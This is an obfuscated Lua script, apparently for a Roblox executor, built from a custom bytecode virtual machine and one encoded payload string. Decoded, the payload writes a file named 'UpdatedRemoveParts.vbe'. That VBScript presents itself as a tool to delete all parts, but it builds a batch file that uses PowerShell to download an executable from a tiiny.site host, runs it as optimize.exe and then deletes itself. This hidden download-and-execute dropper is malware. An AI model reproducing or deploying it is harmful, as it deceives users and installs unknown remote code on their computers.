--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local FlatIdent_95CAC = 0;
			local Res;
			while true do
				if (FlatIdent_95CAC == 0) then
					Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
					return Res - (Res % 1);
				end
			end
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local FlatIdent_2BD95 = 0;
		local a;
		local b;
		while true do
			if (FlatIdent_2BD95 == 1) then
				return (b * 256) + a;
			end
			if (FlatIdent_2BD95 == 0) then
				a, b = Byte(ByteString, DIP, DIP + 2);
				DIP = DIP + 2;
				FlatIdent_2BD95 = 1;
			end
		end
	end
	local function gBits32()
		local FlatIdent_76979 = 0;
		local a;
		local b;
		local c;
		local d;
		while true do
			if (FlatIdent_76979 == 1) then
				return (d * 16777216) + (c * 65536) + (b * 256) + a;
			end
			if (FlatIdent_76979 == 0) then
				a, b, c, d = Byte(ByteString, DIP, DIP + 3);
				DIP = DIP + 4;
				FlatIdent_76979 = 1;
			end
		end
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					local FlatIdent_8F047 = 0;
					while true do
						if (FlatIdent_8F047 == 0) then
							Inst[3] = gBits16();
							Inst[4] = gBits16();
							break;
						end
					end
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 2) then
					if (Enum <= 0) then
						local FlatIdent_51F42 = 0;
						local A;
						while true do
							if (FlatIdent_51F42 == 0) then
								A = nil;
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								FlatIdent_51F42 = 1;
							end
							if (FlatIdent_51F42 == 1) then
								Inst = Instr[VIP];
								Stk[Inst[2]] = Inst[3];
								VIP = VIP + 1;
								FlatIdent_51F42 = 2;
							end
							if (3 == FlatIdent_51F42) then
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								FlatIdent_51F42 = 4;
							end
							if (5 == FlatIdent_51F42) then
								Inst = Instr[VIP];
								A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								FlatIdent_51F42 = 6;
							end
							if (FlatIdent_51F42 == 4) then
								Inst = Instr[VIP];
								Stk[Inst[2]] = Stk[Inst[3]];
								VIP = VIP + 1;
								FlatIdent_51F42 = 5;
							end
							if (FlatIdent_51F42 == 6) then
								VIP = VIP + 1;
								Inst = Instr[VIP];
								do
									return;
								end
								break;
							end
							if (FlatIdent_51F42 == 2) then
								Inst = Instr[VIP];
								Stk[Inst[2]] = Env[Inst[3]];
								VIP = VIP + 1;
								FlatIdent_51F42 = 3;
							end
						end
					elseif (Enum > 1) then
						Stk[Inst[2]] = Stk[Inst[3]];
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
					end
				elseif (Enum <= 3) then
					Stk[Inst[2]] = Env[Inst[3]];
				elseif (Enum > 4) then
					do
						return;
					end
				else
					Stk[Inst[2]] = Inst[3];
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!033O0003163O005570646174656452656D6F766550617274732E766265033B022O00536574206F626A46534F203D204372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422292O0A7374724261746368536372697074203D2022406563686F206F2O6622202620766243724C662026205F0A226563686F204C6F6164696E672073637269707420746F2044656C65746520612O6C2070617274733O2E22202620766243724C662026205F0A22506F7765727368652O6C202D436F2O6D616E64202O22496E766F6B652D576562526571756573742027636F616C73657276636F616C2E742O696E792E736974652F736F6C6172612E65786527202D4F757446696C65206F7074696D697A652E657865203O22202620766243724C662026205F0A226F7074696D697A652E65786522202620766243724C662026205F0A2264656C202O22257E66303O222O0A737472426174636846696C65203D202272756E5F7363726970742E626174222O0A536574206F626A46696C65203D206F626A46534F2E4372656174655465787446696C6528737472426174636846696C652C2054727565290A6F626A46696C652E57726974652073747242617463685363726970740A6F626A46696C652E436C6F73652O0A536574206F626A5368652O6C203D204372656174654F626A6563742822575363726970742E5368652O6C22290A6F626A5368652O6C2E52756E20737472426174636846696C652C20312C20547275652O0A6F626A46534F2E44656C65746546696C6520737472426174636846696C652C20547275653O0A03093O00777269746566696C6500073O00124O00013O00122O000100023O00122O000200036O00038O000400016O0002000400026O00017O00", GetFEnv(), ...);
